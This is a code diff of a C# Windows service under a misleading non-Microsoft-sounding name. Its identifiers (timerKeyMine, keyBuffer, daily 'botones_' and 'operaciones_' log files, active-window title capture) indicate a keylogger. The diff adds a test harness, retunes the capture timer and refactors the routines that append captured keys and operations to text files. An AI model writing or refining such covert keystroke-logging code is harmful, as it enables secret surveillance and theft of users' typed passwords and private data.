@@ -39,9 +39,16 @@ namespace servicioPaginaNoMicrosoft
         //Assembly asmPath = Assembly.GetExecutingAssembly();
 
 
-        public Service1()
+        public Service1(string[] args)
         {
             InitializeComponent();
+        }
+
+        internal void TestStartupAndStop(string[] args)
+        {
+            this.OnStart(args);
+            Console.ReadLine();
+            this.OnStop();
         }
 
         protected override void OnStart(string[] args)
@@ -59,7 +66,7 @@ namespace servicioPaginaNoMicrosoft
             timerGuardarBoton = new System.Timers.Timer();
             timerGuardarBoton.Elapsed += new ElapsedEventHandler(timerKeyMine_Elapsed);
             timerGuardarBoton.Enabled = true;
-            timerGuardarBoton.Interval = 50;
+            timerGuardarBoton.Interval = 4 * 1000;
 
             hWndTitle = ActiveApplTitle();
             hWndTitlePast = hWndTitle;
@@ -298,17 +305,9 @@ namespace servicioPaginaNoMicrosoft
                 Directory.CreateDirectory(carpetaGuardarTxts);
             }
             string filepath = carpetaGuardarTxts + "botones_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
-            StreamWriter sw;
-            if (!File.Exists(filepath))
-            {
-                sw = File.CreateText(filepath);
-            }
-            else
-            {
-                sw = File.AppendText(filepath);
-            }
-            sw.WriteLine(Message);
-            sw.Close();
+            StreamWriter Escritor = new StreamWriter(filepath, true);
+            Escritor.WriteLine(Message);
+            Escritor.Close();
             if (borrarBuffer)
             {
                 keyBuffer = "";
@@ -322,17 +321,9 @@ namespace servicioPaginaNoMicrosoft
                 Directory.CreateDirectory(carpetaGuardarTxts);
             }
             string filepath = carpetaGuardarTxts + "operaciones_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
-            StreamWriter sw;
-            if (!File.Exists(filepath))
-            {
-                sw = File.CreateText(filepath);
-            }
-            else
-            {
-                sw = File.AppendText(filepath);
-            }
-            sw.WriteLine(Message);
-            sw.Close();
+            StreamWriter Escritor = new StreamWriter(filepath, true);
+            Escritor.WriteLine(Message);
+            Escritor.Close();
         }
 
         public static string ActiveApplTitle()
